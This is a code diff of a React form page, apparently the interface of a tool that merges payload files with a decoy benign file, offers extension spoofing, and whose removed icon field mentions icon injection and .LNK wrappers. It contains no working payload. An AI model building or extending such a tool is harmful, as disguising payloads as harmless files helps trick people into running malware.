@@ -24,7 +24,6 @@ import { Textarea } from '@/components/ui/textarea';
 const formSchema = z.object({
   payloadFiles: z.array(z.any()).refine(files => files?.length > 0 && files.every(f => f?.length === 1), "At least one payload file is required."),
   benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
-  iconFile: z.any().optional(),
   outputName: z.string().min(1, "Output name is required."),
   outputFormat: z.string(),
   extensionSpoofing: z.boolean().default(false),
@@ -253,7 +252,6 @@ export default function MergingStationPage() {
                   </div>
                   <Separator />
                   <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
@@ -347,4 +345,3 @@ export default function MergingStationPage() {
     </div>
   );
 }
-
